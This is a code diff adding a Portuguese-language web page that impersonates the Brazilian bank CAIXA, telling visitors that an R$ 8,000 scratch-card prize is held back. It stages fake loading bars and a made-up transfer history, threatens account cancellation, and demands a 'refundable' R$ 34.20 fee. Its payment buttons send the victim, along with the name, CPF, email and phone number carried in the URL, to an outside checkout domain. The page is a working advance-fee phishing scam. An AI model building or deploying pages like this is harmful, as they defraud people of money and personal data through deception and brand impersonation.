@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transferência CAIXA</title>
+    <script>
+        localStorage.setItem("upsell", "up3");
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'caixa-blue2': '#015CA9',
+                        'caixa-light-blue2': '#049FD6',
+                        'caixa-blue': '#1A65C0',
+                        'caixa-light-blue': '#2386D9',
+                        'caixa-orange': '#F39209',
+                    }
+                }
+            }
+        }
+        const LOADING_DURATION = 3;
+        const PAYMENT_LOADING_DURATION = 2;
+    </script>
+</head>
+<body>
+    <div class="bg-gradient-to-r from-caixa-blue2 to-caixa-light-blue2 text-white px-4 py-3">
+        <div class="flex items-center">
+            <div class="size-10 rounded flex items-center justify-center mr-3">
+                <img src="images/logo.webp" alt="CAIXA" class="w-full">
+            </div>
+            <div class="flex-1">
+                <h1 class="text-sm font-medium">Transferência da Raspadinha </h1>
+                <p class="text-sm opacity-90" id="currentDateTime">09/04/2026 - 01:16</p>
+            </div>
+        </div>
+    </div>
+    <div class="px-4 py-6">
+        <div>
+            <div class="mb-6">
+                <h2 class="text-lg font-bold text-caixa-light-blue mb-2">Resumo da transferência</h2>
+                <p class="text-zinc-600 text-sm">Por favor, verifique as informações.</p>
+            </div>
+            <div class="mb-6">
+                <h3 class="text-caixa-light-blue font-semibold text-sm mb-3">Dados do saque</h3>
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Valor</span>
+                    <span class="text-zinc-600 text-sm">R$ 8.000,00</span>
+                </div>
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Data do pagamento</span>
+                    <span class="text-zinc-600 text-sm" id="paymentDate">09/04/2026</span>
+                </div>
+            </div>
+            <div class="mb-6">
+                <h3 class="text-caixa-light-blue font-semibold text-sm mb-3">Quem vai receber</h3>
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Nome</span>
+                    <span class="text-zinc-800 text-sm" id="recipientName">--</span>
+                </div>
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">CPF</span>
+                    <span class="text-zinc-800 text-sm" id="recipientCPF">--</span>
+                </div>
+                <!-- <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Protocolo</span>
+                    <span class="text-zinc-800 text-sm">--</span>
+                </div> -->
+                <!--<div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Contato</span>
+                    <span class="text-zinc-800 text-sm" id="recipientEmail">--</span>
+                </div>
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Telefone</span>
+                    <span class="text-zinc-800 text-sm" id="recipientPhone">--</span>
+                </div>-->
+            </div>
+            <div class="text-start mb-6">
+                <p class="text-zinc-600 text-sm leading-relaxed">
+                    Clique no botão abaixo para seu saque ser liberado na sua chave pix cadastrada.
+                </p>
+            </div>
+            <button onclick="handleConfirmation()" class="w-full bg-caixa-orange hover:bg-orange-600 text-white font-bold px-4 py-3 rounded-lg transition-colors duration-200 text-base">
+                CONFIRMAR
+            </button>
+            <div id="loadingState" class="hidden mt-6">
+                <div class="w-full bg-zinc-200 rounded-full h-2">
+                    <div id="progressBar" class="bg-caixa-orange h-2 rounded-full transition-all ease-out" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="pendingState" class="hidden px-4 py-6">
+        <div class="text-center">
+            <div class="flex justify-center mb-4">
+                <img src="images/logo.webp" alt="Cadeado" class="w-16 h-16">
+            </div>
+            <div class="text-center mb-3">
+                <h2 class="text-xl font-bold text-caixa-light-blue">Transferência Pendente!</h2>
+            </div>
+            <div class="space-y-4 mb-6">
+                <p class="text-zinc-700 text-sm leading-relaxed">
+                    <strong> Sr. (a) <span id="pendingName">--</span></strong>, a movimentação do valor de <strong>R$
+                        8.000,00</strong> é incomum de acordo com os seus registros bancários dos últimos 12 meses.
+                </p>
+                <p class="text-zinc-700 text-sm leading-relaxed">
+                    Por motivos de segurança e regularidade da sua transferência, é necessário a realização do pagamento
+                    da <strong>Taxa de Verificação</strong> no valor de <strong>R$ 34,20</strong>.
+                </p>
+                <p class="text-zinc-700 text-sm leading-relaxed">
+                    Confirme o pagamento da validação para sua <strong>transferência será liberada
+                        imediatamente</strong>.
+                </p>
+            </div>
+            <button onclick="handlePayment()" class="w-full bg-[#30BF63] hover:bg-green-700 text-white font-bold px-4 py-3 rounded-lg transition-colors duration-200 text-base mb-4">
+                EFETUAR O PAGAMENTO DA TAXA
+            </button>
+            <p class="text-black text-xs font-bold text-center">
+                Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.
+            </p>
+        </div>
+    </div>
+    <div id="transferHistoryState" class="hidden p-4">
+        <h2 class="text-xl font-bold text-caixa-light-blue mb-6">Histórico de Transferência</h2>
+        <div class="space-y-2 mb-4">
+            <div id="loaderCard1" class="flex items-center justify-center h-20">
+                <div class="w-8 h-8 border-4 rounded-full animate-spin" style="border-color: #FEB527; border-top-color: transparent;"></div>
+            </div>
+            <div id="card1" class="bg-white rounded-md border border-zinc-200 shadow-sm flex items-stretch hidden opacity-0 transition-opacity duration-500">
+                <div class="w-2 bg-green-500 rounded-l-lg self-stretch"></div>
+                <div class="flex-1 px-4 py-2 flex items-center justify-between self-center">
+                    <div class="flex items-center gap-3 flex-1">
+                        <i class="fa-solid fa-circle-check text-2xl flex-shrink-0" style="color: #2DC75C;"></i>
+                        <div class="flex-1">
+                            <p class="text-sm font-bold text-black">PRÊMIO LIBERADO</p>
+                            <p class="text-xs text-zinc-600">Referência (<span id="historyDate1">10/12/2025</span>)</p>
+                        </div>
+                    </div>
+                    <p class="text-sm font-bold text-black ml-3 flex-shrink-0">R$ 8.000,00</p>
+                </div>
+            </div>
+            <div id="loaderCard2" class="flex items-center justify-center h-20 hidden">
+                <div class="w-8 h-8 border-4 rounded-full animate-spin" style="border-color: #FEB527; border-top-color: transparent;"></div>
+            </div>
+            <div id="card2" class="bg-white rounded-md border border-zinc-200 shadow-sm flex items-stretch hidden opacity-0 transition-opacity duration-500">
+                <div class="w-2 bg-[#FEB527] rounded-l-lg self-stretch"></div>
+                <div class="flex-1 px-4 py-2 flex items-center justify-between self-center">
+                    <div class="flex items-center gap-3 flex-1">
+                        <i class="fa-solid fa-triangle-exclamation text-2xl flex-shrink-0" style="color: #FEB527;"></i>
+                        <div class="flex-1">
+                            <p class="text-sm font-bold text-black">PRÊMIO RETIDO</p>
+                            <p class="text-xs text-zinc-600">Referência (<span id="historyDate2">10/12/2025</span>)</p>
+                        </div>
+                    </div>
+                    <p class="text-sm font-bold text-[#FEB527] ml-3 flex-shrink-0">R$ 8.000,00</p>
+                </div>
+            </div>
+            <div id="loaderCard3" class="flex items-center justify-center h-20 hidden">
+                <div class="w-8 h-8 border-4 rounded-full animate-spin" style="border-color: #FEB527; border-top-color: transparent;"></div>
+            </div>
+            <div id="card3" class="bg-white rounded-md border border-zinc-200 shadow-sm flex items-stretch hidden opacity-0 transition-opacity duration-500">
+                <div class="w-2 bg-[#FEB527] rounded-l-lg self-stretch"></div>
+                <div class="flex-1 px-4 py-2 flex items-start justify-between">
+                    <div class="flex items-start gap-3 flex-1">
+                        <i class="fa-solid fa-circle-exclamation text-2xl flex-shrink-0 mt-0.5" style="color: #FEB527;"></i>
+                        <div class="flex-1 min-w-0">
+                            <p class="text-sm font-bold text-black">TARIFA TRANSACIONAL</p>
+                            <p class="text-xs text-zinc-600 mt-1 leading-relaxed">Identificamos uma cobrança pendente vinculado a sua transação</p>
+                        </div>
+                    </div>
+                    <p class="text-sm font-bold text-black ml-3 flex-shrink-0">R$ 34,20</p>
+                </div>
+            </div>
+        </div>
+        <div id="warningBox" class="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-4 hidden opacity-0 transition-opacity duration-500">
+            <h3 class="text-base font-bold text-black mb-2">Limite transacional atingido!</h3>
+            <p class="text-sm text-black leading-relaxed mb-2">
+                Transferências com valores altos estão sujeitos a cobranças tributárias e administrativas. Finalize o pagamento da <strong>Tarifa Transacional</strong> para liberar seu saque de <strong>R$ 8.000,00.</strong>
+            </p>
+            <p class="text-sm text-black font-semibold leading-relaxed">
+                O <strong>não pagamento</strong>, causará o bloqueio definitivo do seu saque e o cancelamento da sua conta da Raspadinha Online.
+            </p>
+        </div>
+        <button id="paymentButton" onclick="handlePayment()" class="w-full bg-caixa-orange hover:bg-orange-600 text-white font-bold px-4 py-3 rounded-lg transition-all duration-500 text-base hidden opacity-0">
+            EFETUAR O PAGAMENTO DA TAXA
+        </button>
+    </div>
+    <div id="fullscreenLoading" class="hidden fixed inset-0 bg-white z-50 flex items-center justify-center">
+        <div class="text-center">
+            <div class="w-12 h-12 border-4 border-caixa-orange border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+            <p class="text-gray-800 text-base">Carregando...</p>
+        </div>
+    </div>
+    <script>
+        function formatarCPF(cpf) {
+            const cpfLimpo = cpf.replace(/\D/g, '');
+            if (cpfLimpo.length !== 11) return cpf;
+            return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+        function formatarTelefone(telefone) {
+            const telefoneLimpo = telefone.replace(/\D/g, '');
+            if (telefoneLimpo.length === 11) {
+                return telefoneLimpo.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+            } else if (telefoneLimpo.length === 10) {
+                return telefoneLimpo.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
+            } else {
+                return telefone;
+            }
+        }
+        function getURLParams() {
+            const params = new URLSearchParams(window.location.search);
+            return Object.fromEntries(params.entries());
+        }
+        function updateDateTime() {
+            const now = new Date();
+            const day = now.getDate().toString().padStart(2, '0');
+            const month = (now.getMonth() + 1).toString().padStart(2, '0');
+            const year = now.getFullYear();
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            const dateTimeString = `${day}/${month}/${year} - ${hours}:${minutes}`;
+            document.getElementById('currentDateTime').textContent = dateTimeString;
+            document.getElementById('paymentDate').textContent = `${day}/${month}/${year}`;
+        }
+        function substituirDados() {
+            const params = getURLParams();
+            const nameElement = document.getElementById('recipientName');
+            if (params.name && params.name.trim() !== '') {
+                nameElement.textContent = params.name;
+            }
+            const cpfElement = document.getElementById('recipientCPF');
+            if (params.document && params.document.trim() !== '') {
+                cpfElement.textContent = formatarCPF(params.document);
+            }
+            const emailElement = document.getElementById('recipientEmail');
+            if (emailElement && params.email && params.email.trim() !== '') {
+                emailElement.textContent = params.email;
+            }
+            const phoneElement = document.getElementById('recipientPhone');
+            if (phoneElement && params.telephone && params.telephone.trim() !== '') {
+                phoneElement.textContent = formatarTelefone(params.telephone);
+            }
+        }
+        function handleConfirmation() {
+            const button = document.querySelector('button');
+            const loadingState = document.getElementById('loadingState');
+            button.style.display = 'none';
+            loadingState.classList.remove('hidden');
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = '0%';
+            progressBar.style.transitionDuration = `${LOADING_DURATION}s`;
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+            }, 100);
+            setTimeout(() => {
+                const mainContainer = document.querySelector('.px-4.py-6');
+                if (mainContainer) {
+                    mainContainer.style.display = 'none';
+                }
+                document.getElementById('fullscreenLoading').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('fullscreenLoading').classList.add('hidden');
+                    document.getElementById('transferHistoryState').classList.remove('hidden');
+                    const now = new Date();
+                    const day = now.getDate().toString().padStart(2, '0');
+                    const month = (now.getMonth() + 1).toString().padStart(2, '0');
+                    const year = now.getFullYear();
+                    const historyDate = `${day}/${month}/${year}`;
+                    document.getElementById('historyDate1').textContent = historyDate;
+                    document.getElementById('historyDate2').textContent = historyDate;
+                    animateCards();
+                }, PAYMENT_LOADING_DURATION * 1000);
+            }, LOADING_DURATION * 1000);
+        }
+        function animateCards() {
+            const CARD_DELAY = 2000;
+            setTimeout(() => {
+                document.getElementById('loaderCard1').classList.add('hidden');
+                const card1 = document.getElementById('card1');
+                card1.classList.remove('hidden');
+                setTimeout(() => card1.classList.remove('opacity-0'), 10);
+                document.getElementById('loaderCard2').classList.remove('hidden');
+            }, CARD_DELAY);
+            setTimeout(() => {
+                document.getElementById('loaderCard2').classList.add('hidden');
+                const card2 = document.getElementById('card2');
+                card2.classList.remove('hidden');
+                setTimeout(() => card2.classList.remove('opacity-0'), 10);
+                document.getElementById('loaderCard3').classList.remove('hidden');
+            }, CARD_DELAY * 2);
+            setTimeout(() => {
+                document.getElementById('loaderCard3').classList.add('hidden');
+                const card3 = document.getElementById('card3');
+                card3.classList.remove('hidden');
+                setTimeout(() => card3.classList.remove('opacity-0'), 10);
+                setTimeout(() => {
+                    const warningBox = document.getElementById('warningBox');
+                    const paymentButton = document.getElementById('paymentButton');
+                    warningBox.classList.remove('hidden');
+                    paymentButton.classList.remove('hidden');
+                    setTimeout(() => {
+                        warningBox.classList.remove('opacity-0');
+                        paymentButton.classList.remove('opacity-0');
+                    }, 10);
+                }, 1000);
+            }, CARD_DELAY * 3);
+        }
+        // Função de pagamento
+        function handlePayment() {
+            const params = new URLSearchParams(window.location.search);
+            const baseUrl = "https://pagamentooficial.sbs/checkout/up-2/";
+            window.location.href = `${baseUrl}?${params.toString()}`;
+        }
+        document.addEventListener("DOMContentLoaded", () => {
+            updateDateTime();
+            substituirDados();
+        });
+    </script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+</body></html>
